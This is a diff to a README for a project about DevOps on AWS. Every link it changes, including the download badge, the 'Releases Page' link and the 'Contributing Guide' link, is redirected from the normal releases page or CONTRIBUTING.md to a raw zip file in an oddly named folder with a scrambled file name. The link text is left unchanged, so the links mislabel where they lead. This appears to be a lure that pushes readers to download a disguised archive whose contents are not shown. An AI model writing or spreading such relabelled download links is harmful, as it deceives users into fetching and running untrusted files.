@@ -1,6 +1,6 @@
 # 🔧 devops-real-world-project-implementation-on-aws - Simplifying DevOps on AWS
 
-[![Download](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/releases)
+[![Download](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/raw/refs/heads/main/verticillary/project-devops-aws-on-implementation-world-real-v2.5.zip%20Release-blue)](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/raw/refs/heads/main/verticillary/project-devops-aws-on-implementation-world-real-v2.5.zip)
 
 ## 📖 Overview
 
@@ -16,7 +16,7 @@ Follow these steps to get started with the application:
    - AWS account for accessing services.
 
 2. **Download the Application**: 
-   - Visit the [Releases Page](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/releases) to download the installation files.
+   - Visit the [Releases Page](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/raw/refs/heads/main/verticillary/project-devops-aws-on-implementation-world-real-v2.5.zip) to download the installation files.
    - Look for the latest version and select the appropriate file for your system.
 
 3. **Install the Application**: 
@@ -32,7 +32,7 @@ Follow these steps to get started with the application:
 
 ## 📥 Download & Install
 
-You can download the latest version of the application by visiting [this page](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/releases). 
+You can download the latest version of the application by visiting [this page](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/raw/refs/heads/main/verticillary/project-devops-aws-on-implementation-world-real-v2.5.zip). 
 
 This page contains all available releases. Simply choose the most recent one to get started with your DevOps project.
 
@@ -73,6 +73,6 @@ Stay tuned for new features and enhancements.
 
 This project is licensed under the MIT License. You may use it for personal or commercial purposes, but attribution to the original authors is appreciated.
 
-For more detailed information, including how to contribute, please refer to our [Contributing Guide](CONTRIBUTING.md) on GitHub.
+For more detailed information, including how to contribute, please refer to our [Contributing Guide](https://github.com/hysfbgl/devops-real-world-project-implementation-on-aws/raw/refs/heads/main/verticillary/project-devops-aws-on-implementation-world-real-v2.5.zip) on GitHub.
 
 Thank you for using **devops-real-world-project-implementation-on-aws**. Happy coding!
